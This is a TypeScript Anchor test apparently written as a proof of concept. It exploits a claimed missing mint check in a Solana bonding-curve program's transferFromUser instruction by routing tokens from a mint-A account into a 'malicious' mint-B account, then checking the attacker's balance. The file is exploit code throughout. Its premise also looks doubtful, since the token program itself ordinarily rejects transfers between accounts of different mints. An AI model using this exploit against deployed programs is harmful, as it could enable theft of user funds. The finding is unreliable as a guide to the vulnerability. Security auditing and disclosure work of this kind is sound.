import * as anchor from "@project-serum/anchor";
import { Program } from "@project-serum/anchor";
// adjust imports to the projects setup
import { DynamicBondingCurve } from "../target/types/dynamic_bonding_curve";
import { createMint, createTokenAccount, mintTo, getTokenBalance } from "./utils";

describe("PoC: missing mint validation in transfer_from_user", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.DynamicBondingCurve as Program<DynamicBondingCurve>;

  it("should allow transfer to mismatched token account", async () => {
    // 1. Creates two different mints:
    const mintA = await createMint(provider);
    const mintB = await createMint(provider);

    // 2. Create token accounts:
    const userTokenA = await createTokenAccount(provider, mintA, provider.wallet.publicKey);
    const attackerAccountB = await createTokenAccount(provider, mintB, provider.wallet.publicKey);

    // 3. Mint to user's account:
    await mintTo(provider, mintA, userTokenA, provider.wallet.publicKey, 1000);

    // 4. Call vulnerable instruction, passing mismatched destination:
    await program.methods
      .transferFromUser(new anchor.BN(100))
      .accounts({
        authority: provider.wallet.publicKey,
        tokenMint: mintA,
        tokenOwnerAccount: userTokenA,
        destinationTokenAccount: attackerAccountB, // malicious
        tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
      })
      .rpc();

    // 5. Validate attacker got tokens:
    const attackerBalance = await getTokenBalance(provider, attackerAccountB);
    console.log("Attacker balance:", attackerBalance.toNumber());
    if (attackerBalance.toNumber() === 0) {
      throw new Error("PoC failed: attacker did not receive tokens");
    }
  });
});
